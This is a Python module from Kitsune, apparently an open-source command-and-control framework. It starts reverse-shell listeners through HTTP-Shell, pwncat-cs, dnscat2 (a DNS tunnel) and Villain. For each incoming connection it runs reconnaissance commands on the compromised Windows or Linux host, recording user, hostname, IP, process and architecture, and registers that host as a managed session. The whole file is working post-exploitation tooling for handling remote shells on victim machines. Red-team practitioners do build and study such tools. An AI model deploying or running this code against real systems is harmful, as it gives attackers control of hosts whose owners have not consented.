#!/usr/bin/python3
#=========================#
#  Kitsune by @JoelGMSec  #
#      darkbyte.net       #
#=========================#

import os
import time
import pexpect
import datetime
from threading import Thread
from modules.session import Session

def check_user_host(user, hostname):
    if user in ["Unknown", None, ""]:
        if "\n" in hostname:
            parts = hostname.split("\n")
            user = parts[0].strip()
            hostname = parts[1].strip()
        elif "\\" in hostname:
            parts = hostname.split("\\")
            user = parts[0].strip()
            hostname = parts[1].strip()
    
    if hostname in ["Unknown", None, ""]:
        if "\n" in user:
            parts = user.split("\n")
            hostname = parts[1].strip()
            user = parts[0].strip()
        elif "\\" in user:
            parts = user.split("\\")
            hostname = parts[1].strip()
            user = parts[0].strip()
    
    user = user.split("\n")[0].split("\\")[0].strip() if user else "Unknown"
    hostname = hostname.split("\n")[0].split("\\")[0].strip() if hostname else "Unknown" 
    return user, hostname
    
def http_shell(app, host, port, name, session):
    from modules.command import read_output_nonblocking

    session_info = {
        "Session": session,  
        "User": "Unknown",
        "Hostname": "Unknown",  
        "IP Address": "Unknown",
        "Process": "Unknown",  
        "Arch": "Unknown",  
        "Listener": name,  
        "Tail": "HTTP-Shell"
    }

    revshell_path = "tails/HTTP-Shell"
    session_data = pexpect.spawn(f'{os.sys.executable} HTTP-Server.py {port} -silent', cwd=revshell_path, echo=False, use_poll=False)  
    session_data.timeout = 1

    try:
        session_data.expect("HTTP-Shell", timeout=None)
        session_data.sendline("whoami") ; time.sleep(1)
        output = read_output_nonblocking(session_data, "whoami")

        get_host = "[System.Net.Dns]::GetHostByName($env:computerName).Hostname"
        get_ip = "(Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DefaultIPGateway -ne $null}).IPAddress | select-object -first 1"
        get_process = '(Get-WmiObject Win32_Process -Filter "ProcessId = $pid").ProcessName'
        get_arch = "(Get-CimInstance Win32_operatingsystem).OSArchitecture.split()[0]"
        windows_commands = [get_host, get_ip, "$pid", get_process, get_arch]
        linux_commands = ["head -1 /etc/hostname", "ip a | grep inet | grep -v inet6 | grep -v 127 | awk '{print $2}'", "echo $$", "ps -p $$ -o comm=", "uname -m"]

        if "\\" in output:
            commands = windows_commands
            session_info["User"] = (output.split("\\")[1]).lower().split()[-1].strip()
        else:
            commands = linux_commands
            session_info["User"] = output.lower().split()[-1].strip()
    
        for cmd in commands:
            session_data.sendline(cmd) ; time.sleep(1)
            output = read_output_nonblocking(session_data, cmd)

            if "GetHostByName" in cmd or cmd.startswith("head -1 /etc/hostname"):
                session_info["Hostname"] = output.lower().split()[0].strip()
            elif "DefaultIPGateway" in cmd or cmd.startswith("ip a"):
                session_info["IP Address"] = output.split("/")[0].strip()
            elif cmd.startswith("$pid") or cmd.startswith("echo"):
                session_info["PID"] = output
            elif "ProcessName" in cmd or cmd.startswith("ps -p"):         
                if "$pid" in commands and not output:
                    session_info["Process"] = "powershell.exe"
                else:
                    session_info["Process"] = output.lower().strip()
            elif "Get-CimInstance" in cmd or cmd.startswith("uname -m"):
                if "64" in output:
                    session_info["Arch"] = "x64"
                else:
                    session_info["Arch"] = "x86"

        session_info["User"], session_info["Hostname"] = check_user_host(session_info["User"],session_info["Hostname"])
        if session_info["Hostname"] != "Unknown" and session_info["Hostname"]:
            session_info["Session"] = Session.find_existing_session(app, session_info["User"], session_info["Hostname"], session_info["Listener"], session_info["Tail"])
            title = f"Session {session_info['Session']}"
            current_time = datetime.datetime.now().strftime("%H:%M:%S")  
            new_line = f"[{current_time}] New connection from {session_info['Hostname']} on {title}!\n"
            app.add_event_viewer_log(new_line, 'color_success', "#00FF99")

            session_id = session_info["Session"]
            commands = Session.load_commands_from_session(app, session_id)
            Session.save_session(app, session_info, commands)

            title = f"Session {session_info['Session']}"
            Session.add_session_to_treeview(app, session_info, session_data)
            Session.add_new_session(app, title, session_id, session_info, session_data)

    except (pexpect.EOF, pexpect.TIMEOUT):
        if not app.silent_error:
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            error_message = f"[{current_time}] Error: Failed listening with HTTP-Shell on port {port}!\n"
            app.add_event_viewer_log(error_message, 'color_error', "#FF0055")

def http_shell_thread(app, host, port, name, session):
    def run_http_shell():
        try:
            http_shell(app, host, port, name, session)
        except:
            pass

    current_time = datetime.datetime.now().strftime("%H:%M:%S")  
    connecting_line = f"[{current_time}] Listening with HTTP-Shell on port {port}..\n"
    app.add_event_viewer_log(connecting_line, 'color_input', "#00AAFF")

    http_shell_thread = Thread(target=run_http_shell)
    http_shell_thread.tail = "HTTP-Shell"  
    http_shell_thread.daemon = True
    http_shell_thread.start()
    return http_shell_thread

def pwncat(app, host, port, name, session):
    from modules.command import read_output_pwncat

    ip_address = "ip a | grep inet | grep -v inet6 | grep -v 127 | awk '{print $2}'"
    commands = ["$null", "$null", "$null", "$null", "whoami", "head -1 /etc/hostname", ip_address, "echo $$", "ps -p $$ -o comm=", "uname -m"]
    session_info = {
        "Session": session,  
        "User": "Unknown",
        "Hostname": "Unknown",  
        "IP Address": "Unknown",
        "Process": "Unknown",  
        "Arch": "Unknown",  
        "Listener": name,  
        "Tail": "PwnCat-CS",
    }

    pwncat_path = f'/tmp/pwncat'
    os.makedirs(pwncat_path, exist_ok=True)
    
    session_data = pexpect.spawn(f'{os.sys.executable} /usr/local/bin/pwncat-cs 0.0.0.0 {port}', cwd=pwncat_path, echo=False, use_poll=False)  
    session_data.timeout = 1

    try:
        session_data.expect("registered", timeout=None)  
        session_data.sendline("back")

        for cmd in commands:
            session_data.sendline(cmd) ; 
            output = read_output_pwncat(session_data, cmd)

            try:
                if cmd.startswith("whoami"):
                    session_info["User"] = output.lower().strip()
                elif cmd.startswith("head -1"):
                    session_info["Hostname"] = output.lower().strip()
                elif cmd.startswith("ip a"):
                    if "grep" in output:
                        session_info["IP Address"] = output.split("'")[-1].strip().split("/")[0]
                    else:
                        session_info["IP Address"] = output.split("/")[0].strip()
                elif cmd.startswith("echo"):
                    session_info["PID"] = output.strip()
                elif cmd.startswith("ps -p"):
                    session_info["Process"] = output.lower().strip()
                elif cmd.startswith("uname -m"):
                    if "64" in output:
                        session_info["Arch"] = "x64"
                    else:
                        session_info["Arch"] = "x86"
            except:
                pass

        session_info["User"], session_info["Hostname"] = check_user_host(session_info["User"],session_info["Hostname"])
        if session_info["Hostname"] != "Unknown" and session_info["Hostname"]:
            session_info["Session"] = Session.find_existing_session(app, session_info["User"], session_info["Hostname"], session_info["Listener"], session_info["Tail"])
            title = f"Session {session_info['Session']}"
            current_time = datetime.datetime.now().strftime("%H:%M:%S")  
            new_line = f"[{current_time}] New connection from {session_info['Hostname']} on {title}!\n"
            app.add_event_viewer_log(new_line, 'color_success', "#00FF99")

            session_id = session_info["Session"]
            commands = Session.load_commands_from_session(app, session_id)
            Session.save_session(app, session_info, commands)

            title = f"Session {session_info['Session']}"
            Session.add_session_to_treeview(app, session_info, session_data)
            Session.add_new_session(app, title, session_id, session_info, session_data)

    except (pexpect.EOF, pexpect.TIMEOUT):  
        if not app.silent_error:
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            error_message = f"[{current_time}] Error: Failed listening with PwnCat-CS on port {port}!\n"
            app.add_event_viewer_log(error_message, 'color_error', "#FF0055")

def pwncat_rev_thread(app, host, port, name, session):
    def run_pwncat():
        try:
            pwncat(app, host, port, name, session)
        except:
            pass

    current_time = datetime.datetime.now().strftime("%H:%M:%S")  
    connecting_line = f"[{current_time}] Listening with PwnCat-CS on port {port}..\n"
    app.add_event_viewer_log(connecting_line, 'color_input', "#00AAFF")

    pwncat_thread = Thread(target=run_pwncat)
    pwncat_thread.daemon = True
    pwncat_thread.start()
    return pwncat_thread

def dnscat2(app, host, port, name, session):
    from modules.command import read_output_dnscat2

    session_info = {
        "Session": session,  
        "User": "Unknown",
        "Hostname": "Unknown",  
        "IP Address": "Unknown",
        "Process": "Unknown",  
        "Arch": "Unknown",  
        "Listener": name,  
        "Tail": "DnsCat2"
    }

    dnscat2_path = "/tmp/Kitsune/dnscat2"
    os.makedirs(dnscat2_path, exist_ok=True)

    session_data = pexpect.spawn(f'dnscat2-server -u -e open -s {port} -d "domain=kit.su.ne"', cwd=dnscat2_path, echo=False, use_poll=False)  
    session_data.timeout = 1

    try:
        session_data.expect("ping", timeout=None)  
        session_data.sendline("\n")
        session_data.sendline("shell")
        session_data.expect("ctrl", timeout=None)
        time.sleep(3)

        session_data.sendline("whoami")
        output = read_output_dnscat2(session_data, "whoami")

        get_host = "[System.Net.Dns]::GetHostByName($env:computerName).Hostname"
        get_ip = "(Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DefaultIPGateway -ne $null}).IPAddress | select-object -first 1"
        get_process = '(Get-WmiObject Win32_Process -Filter "ProcessId = $pid").ProcessName'
        get_arch = "(Get-CimInstance Win32_operatingsystem).OSArchitecture.split()[0]"
        windows_commands = [get_host, get_ip, "$pid", get_process, get_arch]
        linux_commands = ["head -1 /etc/hostname", "ip a | grep inet | grep -v inet6 | grep -v 127 | awk '{print $2}'", "echo $$", "ps -p $$ -o comm=", "uname -m"]

        if "\\" in output:
            commands = windows_commands
            session_info["User"] = (output.split("\\")[1]).lower().split()[-1].strip()
        else:
            commands = linux_commands
            session_info["User"] = output.lower().split()[-1].strip()
    
        for cmd in commands:
            session_data.sendline("\n")
            session_data.sendline(cmd)
            time.sleep(3)
            output = read_output_dnscat2(session_data, cmd)

            if "GetHostByName" in cmd or cmd.startswith("head -1 /etc/hostname"):
                session_info["Hostname"] = output.lower().split()[0].strip()
            elif "DefaultIPGateway" in cmd or cmd.startswith("ip a"):
                session_info["IP Address"] = output.split("/")[0].strip()
            elif cmd.startswith("$pid") or cmd.startswith("echo"):
                session_info["PID"] = output
            elif "ProcessName" in cmd or cmd.startswith("ps -p"):         
                if "$pid" in commands and not output:
                    session_info["Process"] = "powershell.exe"
                else:
                    session_info["Process"] = output.lower().strip()
            elif "Get-CimInstance" in cmd or cmd.startswith("uname -m"):
                if "64" in output:
                    session_info["Arch"] = "x64"
                else:
                    session_info["Arch"] = "x86"

        session_info["User"], session_info["Hostname"] = check_user_host(session_info["User"],session_info["Hostname"])
        if session_info["Hostname"] != "Unknown" and session_info["Hostname"]:
            session_info["Session"] = Session.find_existing_session(app, session_info["User"], session_info["Hostname"], session_info["Listener"], session_info["Tail"])
            title = f"Session {session_info['Session']}"
            current_time = datetime.datetime.now().strftime("%H:%M:%S")  
            new_line = f"[{current_time}] New connection from {session_info['Hostname']} on {title}!\n"
            app.add_event_viewer_log(new_line, 'color_success', "#00FF99")

            session_id = session_info["Session"]
            commands = Session.load_commands_from_session(app, session_id)
            Session.save_session(app, session_info, commands)

            title = f"Session {session_info['Session']}"
            Session.add_session_to_treeview(app, session_info, session_data)
            Session.add_new_session(app, title, session_id, session_info, session_data)

    except (pexpect.EOF, pexpect.TIMEOUT):
        if not app.silent_error:
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            error_message = f"[{current_time}] Error: Failed listening with DnsCat2 on port {port}!\n"
            app.add_event_viewer_log(error_message, 'color_error', "#FF0055")

def dnscat2_thread(app, host, port, name, session):
    def run_dnscat2():
        try:
            dnscat2(app, host, port, name, session)
        except:
            pass

    current_time = datetime.datetime.now().strftime("%H:%M:%S")  
    connecting_line = f"[{current_time}] Listening with dnscat2 on port {port}..\n"
    app.add_event_viewer_log(connecting_line, 'color_input', "#00AAFF")

    dnscat2_thread = Thread(target=run_dnscat2)
    dnscat2_thread.tail = "dnscat2"  
    dnscat2_thread.daemon = True
    dnscat2_thread.start()
    return dnscat2_thread

def villain(app, host, port, name, session):
    from modules.command import read_output_nonblocking

    session_info = {
        "Session": session,  
        "User": "Unknown",
        "Hostname": "Unknown",  
        "IP Address": "Unknown",
        "Process": "Unknown",  
        "Arch": "Unknown",  
        "Listener": name,  
        "Tail": "Villain"
    }

    villain_path = 'tails/Villain'
    port1, port2, port3 = app.get_next_ports()
    session_data = pexpect.spawn(f'{os.sys.executable} Villain.py -i -n {port} -p {port1} -x {port2} -f {port3}', cwd=villain_path, echo=False, use_poll=False)
    session_data.timeout = 1

    session_data.expect_exact("Villain", timeout=120)
    session_data.expect_exact("New session established", timeout=None) ; time.sleep(3)
    session_line = session_data.before.decode()
    villain_id = str(session_line).split()[3]
    session_data.sendline("shell " + str (villain_id))
    session_data.expect_exact("deactivate", timeout=120)
    
    try:
        session_data.sendline("whoami")
        output = read_output_nonblocking(session_data, "whoami")

        get_host = "[System.Net.Dns]::GetHostByName($env:computerName).Hostname"
        get_ip = "(Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DefaultIPGateway -ne $null}).IPAddress | select-object -first 1"
        get_process = '(Get-WmiObject Win32_Process -Filter "ProcessId = $pid").ProcessName'
        get_arch = "(Get-CimInstance Win32_operatingsystem).OSArchitecture.split()[0]"
        commands = [get_host, get_ip, "$pid", get_process, get_arch]
        session_info["User"] = (output.split("\\")[1]).lower().split()[-1].strip()

        for cmd in commands:
            session_data.sendline(cmd)
            output = read_output_nonblocking(session_data, cmd)
            
            if "GetHostByName" in cmd:
                session_info["Hostname"] = output.lower().strip()
            elif "DefaultIPGateway" in cmd:
                session_info["IP Address"] = output.strip()
            elif cmd.startswith("$pid"):
                session_info["PID"] = output
            elif "ProcessName" in cmd:      
                if "$pid" in commands and not output:
                    session_info["Process"] = "powershell.exe"
                else:
                    session_info["Process"] = output.lower().strip()
            elif "Get-CimInstance" in cmd:
                if "64" in output:
                    session_info["Arch"] = "x64"
                else:
                    session_info["Arch"] = "x86"

        session_info["User"], session_info["Hostname"] = check_user_host(session_info["User"],session_info["Hostname"])
        if session_info["Hostname"] != "Unknown" and session_info["Hostname"]:
            session_info["Session"] = Session.find_existing_session(app, session_info["User"], session_info["Hostname"], session_info["Listener"], session_info["Tail"])
            title = f"Session {session_info['Session']}"
            current_time = datetime.datetime.now().strftime("%H:%M:%S")  
            new_line = f"[{current_time}] New connection from {session_info['Hostname']} on {title}!\n"
            app.add_event_viewer_log(new_line, 'color_success', "#00FF99")

            session_id = session_info["Session"]
            commands = Session.load_commands_from_session(app, session_id)
            Session.save_session(app, session_info, commands)

            title = f"Session {session_info['Session']}"
            Session.add_session_to_treeview(app, session_info, session_data)
            Session.add_new_session(app, title, session_id, session_info, session_data)

    except (pexpect.EOF, pexpect.TIMEOUT):
        if not app.silent_error:
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            error_message = f"[{current_time}] Error: Failed listening with Villain on port {port}!\n"
            app.add_event_viewer_log(error_message, 'color_error', "#FF0055")

    except:
        pass

def villain_thread(app, host, port, name, session):
    def run_villain():
        try:
            villain(app, host, port, name, session)
        except:
            pass

    current_time = datetime.datetime.now().strftime("%H:%M:%S")  
    connecting_line = f"[{current_time}] Listening with Villain on port {port}..\n"
    app.add_event_viewer_log(connecting_line, 'color_input', "#00AAFF")

    villain_thread = Thread(target=run_villain)
    villain_thread.tail = "Villain"  
    villain_thread.daemon = True
    villain_thread.start()
    return villain_thread
